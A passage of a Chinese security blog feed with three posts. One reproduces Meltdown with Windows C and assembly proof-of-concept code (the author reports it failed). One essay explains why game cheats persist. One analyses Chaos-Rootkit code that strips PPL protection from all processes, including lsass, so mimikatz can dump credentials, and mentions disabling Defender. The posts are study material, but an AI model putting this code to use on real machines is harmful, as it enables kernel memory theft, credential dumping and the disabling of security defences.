class="number">1</span>], <span class="string">&quot;%p&quot;</span>, &amp;target) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;USAGE: meltdown target\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SetProcessAffinityMask(GetCurrentProcess(), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buffer); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Steal#%-2zd&quot;</span>, i);</span><br><span class="line">        buffer[i] = Steal(target + i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buffer); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, (<span class="type">uint32_t</span>)buffer[i]);</span><br><span class="line">        <span class="built_in">printf</span>((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span> || i + <span class="number">1</span> == <span class="keyword">sizeof</span>(buffer) ? <span class="string">&quot;\n&quot;</span> : <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setlocale(LC_CTYPE, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">wchar_t</span> *secret = (<span class="type">wchar_t</span> *)buffer;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(buffer) / <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>); i++)</span><br><span class="line">        putwchar(secret[i]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><code>SetProcessAffinityMask</code>：让程序运行在第一个核心上</li><li>重复运行<code>Steal</code>函数</li><li>打印窃取的数据</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span></span><br><span class="line"><span class="title function_">Steal</span><span class="params">(<span class="type">uint8_t</span> *target)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> retries = <span class="number">0</span>; retries &lt; <span class="number">30000</span>; retries++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            _mm_clflush(&amp;probe_array[i]);</span><br><span class="line">            _mm_pause();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        __try</span><br><span class="line">        &#123;</span><br><span class="line">            OutOfOrderExecution(target, probe_array, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> aux = <span class="number">0</span>;</span><br><span class="line">            <span class="type">uint64_t</span> a = __rdtscp(&amp;aux);</span><br><span class="line">            probe_array[i][<span class="number">0</span>]++;</span><br><span class="line">            <span class="type">uint64_t</span> b = __rdtscp(&amp;aux);</span><br><span class="line">            access_time[i] = b - a;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> idx_min = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (access_time[i] &lt; access_time[idx_min])</span><br><span class="line">                idx_min = i;</span><br><span class="line">            _mm_pause();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (access_time[idx_min] &lt; <span class="number">100</span> &amp;&amp; idx_min != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; =&gt; %02X retries=%-5zd access_time=%llu\n&quot;</span>, (<span class="type">uint32_t</span>)idx_min, retries, access_time[idx_min]);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">uint8_t</span>)idx_min;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _mm_pause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; =&gt; 00\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接收内核地址作为参数。主要结构仍然是之前提到的Flush+Reload，但是使用了<code>OutOfOrderExecution</code>这段汇编，关于这段汇编的原文如下：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250930160214138.png" alt="image-20250930160214138" /></p><blockquote><p>Listing 2: The core of Meltdown. An inaccessible kernel  address is moved to a register, raising an exception.  Subsequent instructions are executed out of order before  the exception is raised, leaking the data from the kernel  address through the indirect memory access.</p><p>清单2：熔断的核心。不可访问的内核地址被移动到寄存器中，从而产生异常。后续指令在异常发生前乱序执行，通过间接访存的方式将数据从内核地址泄露。</p></blockquote><p>这里为了适配windows，编写一段差不多的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">OutOfOrderExecution</span><span class="params">(<span class="type">void</span> *target, <span class="type">void</span> *probe_array, <span class="type">void</span> *null)</span>;</span><br></pre></td></tr></table></figure><p>按照x64的传参顺序：target=rcx  probe_array=rdx  null=r8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line"></span><br><span class="line">OutOfOrderExecution PROC</span><br><span class="line">mov   r8,  qword ptr [r8];读取null指针</span><br><span class="line">movzx rax, byte ptr [rcx];读取内核一个字节，放到rax上</span><br><span class="line">shl   rax, 12;左移0xC，相当于获取到再探针数组上的偏移</span><br><span class="line">mov   al,  byte ptr [rdx + rax];让探针数组缓存</span><br><span class="line">ret</span><br><span class="line">OutOfOrderExecution ENDP</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>这里可以尝试不同的汇编组合，<strong>虽然最后我复现失败了</strong>，如果可行的话测试结果如下[2]：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsuploadsimage-20250930162203429.png" alt="image-20250930162203429" /></p><h1 id="后续章节"><a class="markdownIt-Anchor" href="#后续章节"></a> 后续章节</h1><p>主要讨论了meltdown的性能、arm和AMD处理器上的差异、缓解措施例如KAISER和结论。</p><p>附录中展示了如何在实战环境中利用Meltdown</p><h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1><p>[1] M. Lipp等, 《Meltdown: reading kernel memory from user space》, <em>Commun. ACM</em>, 卷 63, 期 6, 页 46～56, 5月 2020, doi: <a href="https://doi.org/10.1145/3357033">10.1145/3357033</a>.</p><p>[1] <a href="https://www.bilibili.com/video/BV1qV4y1T7Gz">合集·关于编写 x64 Windows 10 驱动以了解虚拟内存这件事</a> 杜龙实验室 <a href="https://www.bilibili.com/video/BV1qV4y1T7Gz">https://www.bilibili.com/video/BV1qV4y1T7Gz</a></p><p>[2] <a href="https://github.com/dulong-lab/video-virtual-memory-materials">video-virtual-memory-materials</a> dulong-lab <a href="https://github.com/dulong-lab/video-virtual-memory-materials">https://github.com/dulong-lab/video-virtual-memory-materials</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/VsGaZ7LqFkziJRpxp0rEBQ&quot;&gt;https://mp.weixin.qq.com/s/VsGaZ7LqFkziJRpxp0rEBQ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;很经典一篇同时具有实践价值和学术研究价值的文章，原文名称：Meltdown: Reading Kernel Memory from User Space [1]。&lt;strong&gt;提前预告：由于没有找到合适的CPU所以复现是失败的&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="note" scheme="https://joe1sn.eu.org/tags/note/"/>
    
    <category term="hardware" scheme="https://joe1sn.eu.org/tags/hardware/"/>
    
  </entry>
  
  <entry>
    <title>【杂谈】为什么外挂难以根除？</title>
    <link href="https://joe1sn.eu.org/2025/08/16/talk-about-game-cheats/"/>
    <id>https://joe1sn.eu.org/2025/08/16/talk-about-game-cheats/</id>
    <published>2025-08-16T06:59:52.000Z</published>
    <updated>2025-09-16T07:03:05.149Z</updated>
    
    <content type="html"><![CDATA[<p>一个略知逆向工程的人谈谈他的看法</p><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cassets%5Ca0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><p>外挂问题一直是《CS:GO》等竞技游戏的最大顽疾，尽管游戏厂商和反作弊团队不断升级技术手段，但外挂仍然屡禁不止。2025年8月，5E对战平台曝出职业选手使用“软路由雷达”作弊，该外挂通过路由器解析游戏数据包获取对手位置，传统检测手段几乎无法识别。这一事件再次凸显了外挂技术的隐蔽性和反作弊的挑战。</p><p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cassets%5Cuploadsimage-20250815113622182.png" alt="image-20250815113622182" /></p><h1 id="电子游戏的本质"><a class="markdownIt-Anchor" href="#电子游戏的本质"></a> 电子游戏的本质</h1><p>电子游戏就是一段运行在计算机上的程序</p><p><strong>电脑</strong>的最基本组成需要：</p><ul><li><p>CPU：中央处理器，处理来自内存的数据。一般包含有寄存器等，寄存器存储<strong>运行中的程序</strong>需要处理的数据，例如进行减少血量的操作就是将血量放入寄存器中然后CPU进行减法运算。</p></li><li><p>主板：安装所有硬件，让各个硬件能进行数据传输。</p></li><li><p>内存：暂存<strong>运行程序</strong>的相关数据，例如程序中的坐标、游戏人物的血量等等。</p></li><li><p>显卡：负责将数据转为屏幕的像素图形成画面。最开始这是CPU的工作，但是CPU不适合大规模的简单运算（让一个博士去狂刷小学加减法，不如让100个小学生去同时运算），英伟达开发的 <strong>Nvidia GeForce 256</strong> 是世界第一个图形处理器（显卡）。</p><p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cassets%5Cuploadsimage-20250815115845791.png" alt="image-20250815115845791" /></p></li><li><p>硬盘：存储<strong>非运行程序</strong>的数据，要使用的时候CPU从硬盘读取或者写入。但是随着时代的进步逐渐出现了直接访问等技术（例如直接从硬盘到显卡、外设到内存双向通信，这也是DMA的基础）。</p></li><li><p>操作系统：对于计算机来说是非必须的，但是对于用户来说很重要。因为他可以协调各个硬件，例如控制程序运行的优先级。</p></li></ul><p>​对于一个常见的联机游戏中数据流程大致如下：</p><p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cassets%5Cuploadsimage-20250815122009027.png" alt="image-20250815122009027" /></p><h2 id="如何修改一个程序的数据"><a class="markdownIt-Anchor" href="#如何修改一个程序的数据"></a> 如何修改一个程序的数据</h2><p>根据上面的数据传输图，我们会发现通过操作系统和硬件可以在不同的访问等级下对不同的位置进行数据的访问，如：</p><p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cassets%5Cuploadsimage-20250815123016587.png" alt="image-20250815123016587" /></p><h2 id="内存挂"><a class="markdownIt-Anchor" href="#内存挂"></a> 内存挂</h2><p>​其中最常用的是<strong>内存挂</strong>，由于游戏的数据会放在内存当中，那么我们使用操作系统提供的方法，或者从操作系统内核中的内存管理，<strong>进行跨进程的内存访问/写入</strong>。例如修改器最常用的cheat engine 对单机游戏的金币等等进行修改。在cs中，一场对局中<strong>所有玩家的坐标位置</strong>也是通过上面的流程保存在内存当中的，这就是透视、自瞄等的原理，部分外挂程序通过读取内存中玩家的坐标数据转到屏幕上进行绘制达到透视的效果。<br /><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cassets%5Cuploadsimage-20240523094055200.png" alt="image-20240523094055200" /></p><p>​由于运行中的程序的指令是暂存在内存当中的，更加高级的内存挂会<strong>直接修改游戏内存中的代码指令</strong>，<strong>让游戏程序自己绘制出玩家位置</strong>，也可以计算射击角度来自瞄等等。这种类型的外挂防护已经比较成熟了，一个思路是将反作弊程序升级到<strong>更高级的系统内核层面</strong>，从一般程序无法访问的<strong>系统内核拦截外挂对游戏内存的访问和修改</strong>。除了拦截之外，还会利用哈希算法校验游戏关键代码是否被修改。还有的会依靠样本库对当前运行的所有程序进行扫描，扫描到已知的外挂程序会做出相应的处理。还有一些是基于行为分析等等。</p><p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cassets%5Cuploadsimage-20240519162215594.png" alt="image-20240519162215594" /></p><h2 id="dma"><a class="markdownIt-Anchor" href="#dma"></a> DMA</h2><p>​<strong>DMA</strong>（<strong>Direct Memory Access</strong>，直接内存访问）技术改变了这一切。回忆之前的内容，所有的硬件需要插在主板上运行，并且为了数据访问速度的加快，部分数据可以不经过CPU直接访问内存。正常的功能例如将电脑硬盘中的资料复制到USB中，原来需要通过CPU将数据读取到内存中，然后CPU再把数据复制到USB中。但是DMA是硬盘直接将数据读取到内存，然后usb的DMA控制器直接从内存中得到数据，<strong>CPU在这一过程中是几乎没有参与的，而之前的外挂是需要CPU来运行的</strong>，因此DMA的内存读写方式是硬件层面直接决定的，<strong>往常的反作弊程序难以探测</strong>。<br />​按照<strong>将反作弊程序升级到更高级、更底层这一思路</strong>，近期例如三角洲行动等使用CPU虚拟化技术来进行DMA的反作弊。CPU虚拟化顾名思义就是允许在单个物理CPU上创建多个隔离的虚拟环境（虚拟机），每个虚拟机可以独立运行操作系统或应用程序。这样就可以对特定程序（例如游戏）单独创建一套系统，<strong>通过将游戏运行在受保护的虚拟环境中、拦截和审核所有对关键硬件（如内存、DMA设备）的访问请求</strong>，实现对DMA外挂的检测。</p><p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cassets%5Cuploadsimage-20250815132333382.png" alt="image-20250815132333382" /></p><h2 id="软路由"><a class="markdownIt-Anchor" href="#软路由"></a> 软路由</h2><p>​回顾上面的数据传输图，游戏数据通过网络传送到电脑上，<strong>网络的传输会通过路由器</strong>。软路由可以说是在路由器中的插件，例如屏蔽特定的域名访问、复制网络流量等等。如果我们能过理清楚游戏和服务器之间的通讯的加密流程，就可以从路由器拦截并解密服务器向游戏发送的数据包，再从<strong>数据包中提取出坐标等相关信息转发</strong>，这样就不需要修改或者访问游戏的任何内存。</p><p><img src="D:%5CBlog%5Cgithub%5Csource_posts%5Cassets%5Cuploads507313ccd0c2aba7cbd123914b2d6d35.png" alt="img" /></p><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>​外挂难以根除的根本原因在于：<strong>游戏必须依赖本地硬件运行，而硬件和网络的开放性为作弊提供了无数切入点</strong>。反作弊与作弊的对抗本质是一场技术军备竞赛，且受限于用户体验、硬件兼容性和黑产利益，短期内无法彻底解决。未来可能需要结合<strong>云端游戏、AI行为分析、法律打击</strong>等多维手段，才能逐步压制外挂的生存空间。</p><p>​不过也可以复兴LAN派对(局域网游戏聚会形式)参与者通常自带电脑，在自由开放的线下空间进行游戏竞技与交流，发现开挂立刻线下真实。</p><h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1><p>[1] <a href="https://csgo.5eplay.com/article/250811chnj5b">5E对战平台“顺藤摸瓜”收网行动</a></p><p>[2] Donovan, Tristan (2010-04-20). <a href="https://en.wikipedia.org/wiki/Replay:_The_History_of_Video_Games"><em>Replay: The History of Video Games</em></a>. Yellow Ant. pp. 1–9. <a href="https://en.wikipedia.org/wiki/ISBN_(identifier)">ISBN</a> <a href="https://en.wikipedia.org/wiki/Special:BookSources/978-0-9565072-0-4">978-0-9565072-0-4</a>.</p><p>[3] <a href="https://blogs.nvidia.com/blog/first-gpu-gaming-ai/">Game-Changer: How the World’s First GPU Leveled Up Gaming and Ignited the AI Era</a></p><p>[4] <a href="https://df.qq.com/cp/a20240906main/newsdetail.html?id=12122266884973296027">反作弊升级｜CPU虚拟化功能上线</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一个略知逆向工程的人谈谈他的看法&lt;/p&gt;</summary>
    
    
    
    
    <category term="note" scheme="https://joe1sn.eu.org/tags/note/"/>
    
    <category term="rootkit" scheme="https://joe1sn.eu.org/tags/rootkit/"/>
    
  </entry>
  
  <entry>
    <title>windows rookit防护-PPL保护</title>
    <link href="https://joe1sn.eu.org/2025/07/29/rookit-3-ppl/"/>
    <id>https://joe1sn.eu.org/2025/07/29/rookit-3-ppl/</id>
    <published>2025-07-29T01:54:55.000Z</published>
    <updated>2025-09-16T06:59:50.649Z</updated>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/ZeroMemoryEx/Chaos-Rootkit">https://github.com/ZeroMemoryEx/Chaos-Rootkit</a></p><p>之前文章:</p><ul><li><a href="https://mp.weixin.qq.com/s/c_q8A4GguT6TBQZBSRcE-w">windows rookit防护-进程隐藏</a></li><li><a href="https://mp.weixin.qq.com/s/KVVluHMpz73mX_7Ect56ng">windows rookit防护-权限提升</a></li></ul><span id="more"></span><p>或许我们的公众号会有更多你感兴趣的内容</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p><h1 id="效果展示"><a class="markdownIt-Anchor" href="#效果展示"></a> 效果展示</h1><p>**为什么我已经提权到了administrator但是mimikatz依旧无法dump lsass？**先不讲长篇大论，直接看看效果有个初次感受。依旧是windows 10 22H2版本，用KDM Mapper加载rootkit后使用。</p><p>使用前：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705152856153.png" alt="image-20250705152856153" /></p><p>使用后：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705152949577.png" alt="image-20250705152949577" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705153118685.png" alt="image-20250705153118685" /></p><p>Chaos-Rootkit的DbgPrint</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705153144968.png" alt="image-20250705153144968" /></p><h1 id="ppl保护介绍"><a class="markdownIt-Anchor" href="#ppl保护介绍"></a> PPL保护介绍</h1><p>​PPL全称是： <code>Protected Process Light</code>，前身是<code>Protected Process</code>。具体区别就是之前的进程只分为受保护和不受保护，没有提供更加细致的保护等级划分，只需要使用 <code>SeDebugPrivilege</code> 令牌权限即可获取任意进程的所有访问权限。在Windows 8.1过后在此基础之上新增了PPL。</p><p>​根据《深入解析Windows操作系统（第7版）（卷1）》中的描述（具体可见3.3.1 受保护进程轻型(PPL)）：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705155550117.png" alt="image-20250705155550117" /></p><p>其中不同的签名方代表不同的信任等级</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250705155627253.png" alt="image-20250705155627253" /></p><p><strong>这样实现低等级的进程即使已经提权也无法对更高等级的进程进行内存读写</strong>，红队中比较常用的就是使用mimikatz进行LSASS Dump，如果存在PPL保护，需要的就不止<code>SeDebugPrivilege</code>了。<strong>这里针对这个一问题进行举例</strong>。</p><h2 id="mimikatz-lsass-dump"><a class="markdownIt-Anchor" href="#mimikatz-lsass-dump"></a> mimikatz LSASS Dump</h2><p>在注册表<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa</code>中新增DWORD 值<code>RunAsPPL</code>，值为1</p><p>如果在AD域中设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">打开组策略管理控制台 (GPMC)。</span><br><span class="line">创建在域级别链接或链接到包含您的计算机帐户的组织单位的新 GPO。或者，您可以选择已部署的 GPO。</span><br><span class="line">右键单击 GPO，然后单击编辑以打开组策略管理编辑器。</span><br><span class="line">展开计算机配置，展开首选项，然后展开Windows 设置。</span><br><span class="line">右键单击注册表，指向新建，然后单击注册表项。将出现“新建注册表属性”对话框。</span><br><span class="line">在Hive列表中，单击HKEY_LOCAL_MACHINE。</span><br><span class="line">在Key Path列表中，浏览至SYSTEM\CurrentControlSet\Control\Lsa。</span><br><span class="line">在值名称框中，键入RunAsPPL。</span><br><span class="line">在值类型框中，单击REG_DWORD。</span><br><span class="line">在数值数据框中，键入00000001。</span><br><span class="line">单击确定。</span><br></pre></td></tr></table></figure><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707102800761.png" alt="image-20250707102800761" /></p><p>即使是管理员权限也不能读取到LSASS中的NTML Hash。</p><p>在加载Rootkit并且强制关闭所有进程（包括Lsass的保护后）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707102719476.png" alt="image-20250707102719476" /></p><h1 id="如何绕过"><a class="markdownIt-Anchor" href="#如何绕过"></a> 如何绕过</h1><p>很明显一个直接思路就是修改注册表<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa</code>，删除或者修改<code>RunAsPPL</code>值。<strong>缺点也很明显，需要重启才能生效。</strong></p><p>这里我们分析rootkit的相关代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">UnprotectAllProcesses</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    PVOID process = <span class="literal">NULL</span>;</span><br><span class="line">    PLIST_ENTRY plist;</span><br><span class="line">    NTSTATUS status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    NTSTATUS ret = <span class="built_in">PsLookupProcessByProcessId</span>((HANDLE)<span class="number">4</span>, (PEPROCESS*)&amp;process);</span><br><span class="line"><span class="comment">// ret check ...</span></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        plist = (PLIST_ENTRY)((<span class="type">char</span>*)process + eoffsets.ActiveProcessLinks_offset);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (plist-&gt;Flink != (PLIST_ENTRY)((<span class="type">char</span>*)process + eoffsets.ActiveProcessLinks_offset))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;Blink: %p, Flink: %p\n&quot;</span>, plist-&gt;Blink, plist-&gt;Flink);</span><br><span class="line"></span><br><span class="line">            ULONG_PTR EProtectionLevel = (ULONG_PTR)plist-&gt;Flink - eoffsets.ActiveProcessLinks_offset + eoffsets.protection_offset;</span><br><span class="line"></span><br><span class="line">            *(BYTE*)EProtectionLevel = (BYTE)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            plist = plist-&gt;Flink;</span><br><span class="line">        &#125;</span><br><span class="line">        status = STATUS_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//__finally &#123;  ...  &#125;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用<code>PsLookupProcessByProcessId</code>从内核中找到system进程（system进程PID恒为4），然后顺着ActiveProcessLink遍历进程，通过<code>protection_offset</code>将<code>EProtectionLevel=0</code>。编程上的思路如此，那么实际内存中呢？重启后使用windbg调试来对比一下。</p><p>复习一下EPROCESS的偏移，也可以参考<code>utils.c</code>中的 <code>InitializeOffsets</code>函数</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707104950168.png" alt="image-20250707104950168" /></p><p>我的版本是19041</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707105043929.png" alt="image-20250707105043929" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707105028382.png" alt="image-20250707105028382" /></p><p>这里查看的是<code>lsass</code>的进程</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707105126194.png" alt="image-20250707105126194" /></p><ul><li>Level：0x41，LSA签名的PPL</li><li>Signer：0x4，对照最开始的表格这里是专指<code>lsass.exe</code></li></ul><p>rootkit中的代码直接将<code>protection level</code>置零，简单粗暴，这里手工实现一下</p><p>修改前：</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707105806648.png" alt="image-20250707105806648" /></p><p>修改后</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707110051493.png" alt="image-20250707110051493" /></p><p>没有任何问题，在rootkit中有一段gui客户端不能调用的代码（可能是我还没发现）</p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707110216421.png" alt="image-20250707110216421" /></p><p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploadsimage-20250707110308618.png" alt="image-20250707110308618" /></p><p>这里提供了更加细致的修改进程保护的选项，但是客户端貌似没有这段ioctl的代码</p><h1 id="更多利用"><a class="markdownIt-Anchor" href="#更多利用"></a> 更多利用</h1><p>比如<code>PROTECTION_LEVEL_ANTIMALWARE_LIGHT</code>就是一个和杀毒软件相关的保护等级，一般来说拥有<code>trustinstaller</code>权限和移除这个进程保护等级才能永久关闭windows defender（关闭进程和删除相关文件）。当然关闭windows defender有更多更优雅的方式，这里只是大致说说如何利用PPL相关权限。</p><p>关于其他保护等级的利用可以搜索更多资料，这里就不再赘述。</p><h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1><p><a href="https://support.kaspersky.com/us/common/windows/13905">https://support.kaspersky.com/us/common/windows/13905</a></p><p><a href="https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals">https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals</a></p><p><a href="https://cloud.tencent.com.cn/developer/article/2013602">https://cloud.tencent.com.cn/developer/article/2013602</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/ZeroMemoryEx/Chaos-Rootkit&quot;&gt;https://github.com/ZeroMemoryEx/Chaos-Rootkit&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;之前文章:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/c_q8A4GguT6TBQZBSRcE-w&quot;&gt;windows rookit防护-进程隐藏&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/KVVluHMpz73mX_7Ect56ng&quot;&gt;windows rookit防护-权限提升&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="note" scheme="https://joe1sn.eu.org/tags/note/"/>
    
    <category term="rootkit" scheme="https://joe1sn.eu.org/tags/rootkit/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】使用CobaltStrike的外置监听器绕过检测-番外</title>
    <link href="https://joe1sn.eu.org/2025/06/23/cs-external-2/"/>
    <id>https://joe1sn.eu.org/2025/06/23/cs-external-2/</id>
    <published>2025-06-23T03:25:14.000Z</published>
